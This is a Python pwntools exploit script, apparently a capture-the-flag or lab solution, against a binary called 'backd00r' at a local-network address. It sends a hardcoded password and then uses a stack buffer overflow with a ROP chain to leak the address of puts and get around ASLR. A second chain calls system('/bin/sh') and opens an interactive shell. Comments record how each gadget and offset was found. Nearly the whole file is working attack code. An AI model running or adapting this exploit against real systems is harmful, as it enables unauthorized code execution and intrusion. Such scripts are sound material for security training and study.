from pwn import *
#echo 2 > /proc/sys/kernel/randomize_va_space
context(arch='amd64', os='linux')

def run():
	local = True

	if local:
		libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
		s = process('backd00r')
	else:
		libc = ELF('libc.so.6')
		s = remote("192.168.56.128",10000)

	offset_binsh = libc.search('/bin/sh').next() #strings -t x /lib/x86_64-linux-gnu/libc.so.6 | grep '/bin/sh'
	offset_puts = libc.sym['puts'] #readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts
	offset_system = libc.sym['system'] #readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system | grep libc





	junk = "A" * (72) 
	plt_puts = 0x4005c0 #objdump -d -M intel backd00r | grep "puts"
	got_puts = 0x602018 #readelf -r backd00r | grep puts
	pop_rdi_ret = 0x400bb3 #ROPgadget --binary backd00r | grep 'pop rdi'
	loop = 0x4009c9 #loop function


	for x in range(0,28):
		print s.recvline()
	print s.recv()


	s.sendline("j&9GCS34MY+^4ud*")
	autenticatec = s.recvline()
	print autenticatec
	if "password: Permission denied" not in autenticatec:

		payload = junk
		payload += p64(pop_rdi_ret)
		payload += p64(got_puts)
		payload += p64(plt_puts)
		payload += p64(loop)

		print payload

		s.sendline(payload)


		print s.recvline()
		s.sendline("exit")

		print s.recvline()
		print s.recvline()
		print s.recvline()
		print s.recvline()
		print s.recvline()



		leak = s.recvline(False)[:8]
		leak += '\x00' * (8 - len(leak))
		puts = u64(leak)

		print "leak: "+ hex(puts)


		libc_base = puts - offset_puts

		print "libc: "+ hex(libc_base)

		binsh = libc_base + offset_binsh
		system = libc_base + offset_system
		 
		p = junk
		p += p64(pop_rdi_ret)
		p += p64(binsh)
		p += p64(system)
		p += p64(pop_rdi_ret)
		p += p64(binsh)
		p += p64(system)

		print p

		s.sendline(p)
		print s.recvline()
		s.sendline("exit")
		print s.recvline()

		try:
			s.sendline("ls")
			ls = s.recvline()
			print ls
			if len(ls) > 0: 
				s.interactive(prompt="")
		except Exception as e:
			pass
		


	else:
		print "senha errada"
		s.close()





run()
